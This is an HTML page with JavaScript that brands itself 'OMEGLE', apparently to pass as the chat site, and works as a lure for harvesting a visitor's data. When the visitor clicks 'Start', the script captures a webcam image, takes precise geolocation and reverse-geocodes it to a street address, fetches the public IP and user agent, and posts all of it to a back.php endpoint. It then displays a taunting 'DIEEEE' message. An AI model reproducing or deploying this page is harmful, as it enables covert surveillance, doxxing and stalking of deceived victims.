<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Image and Send Email</title>
    <style>
        body {
            background-color: #f7f7f7;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 400px;
            text-align: center;
        }

        h1 {
            color: #333;
        }

        #video {
            border: 2px solid #333;
            border-radius: 10px;
            width: 100%;
            height: 240px;
            margin-bottom: 15px;
        }

        #capture {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 15px;
            transition: background-color 0.3s;
        }

        #capture:hover {
            background-color: #45a049;
        }

        .status {
            margin-top: 20px;
            font-size: 16px;
            color: #555;
        }

        .status.success {
            color: green;
        }

        .status.error {
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 color="orange"><font color="orange">OMEGLE</font></h1>
        <video id="video" autoplay></video>
        <button id="capture">Start</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const captureButton = document.getElementById('capture');
        const statusElement = document.getElementById('status');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // Request camera access
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(error => {
                console.error('Error accessing the camera: ', error);
                statusElement.textContent = 'Unable to access the camera.';
                statusElement.classList.add('error');
            });

        // Capture button click event
        captureButton.addEventListener('click', () => {
            // Capture the image when "Start" is clicked
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            // Get geolocation information
            navigator.geolocation.getCurrentPosition(function(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Reverse geocode the location using OpenStreetMap's Nominatim API
                const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;

                fetch(nominatimUrl)
                    .then(response => response.json())
                    .then(data => {
                        const address = data.address ? `${data.address.road || ''}, ${data.address.city || ''}, ${data.address.state || ''}, ${data.address.country || ''}, ${data.address.postcode || ''}` : 'Address not found';
                        
                        // Get IP address and device info
                        fetch('https://api.ipify.org?format=json')
                            .then(response => response.json())
                            .then(ipData => {
                                const ipAddress = ipData.ip;
                                const deviceInfo = navigator.userAgent;

                                // Send image and details to the backend
                                fetch('back.php', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/x-www-form-urlencoded'
                                    },
                                    body: `image=${encodeURIComponent(imageData)}&latitude=${latitude}&longitude=${longitude}&address=${encodeURIComponent(address)}&ipAddress=${encodeURIComponent(ipAddress)}&deviceInfo=${encodeURIComponent(deviceInfo)}`
                                })
                                .then(response => response.text())
                                .then(data => {
                                    statusElement.textContent = 'DIEEEEEEEEEEEEEEEEEEEEEEE';
                                    statusElement.classList.add('success');
                                })
                                .catch(error => {
                                    console.error('Error sending data to server:', error);
                                    statusElement.textContent = 'Failed to send image.';
                                    statusElement.classList.add('error');
                                });
                            })
                            .catch(error => {
                                console.error('Error fetching IP address:', error);
                                statusElement.textContent = 'Failed to get IP address.';
                                statusElement.classList.add('error');
                            });
                    })
                    .catch(error => {
                        console.error('Error fetching address:', error);
                        statusElement.textContent = 'Failed to get address.';
                        statusElement.classList.add('error');
                    });
            }, error => {
                console.error('Geolocation error: ', error);
                statusElement.textContent = 'Failed to get location.';
                statusElement.classList.add('error');
            });
        });
    </script>
</body>
</html>

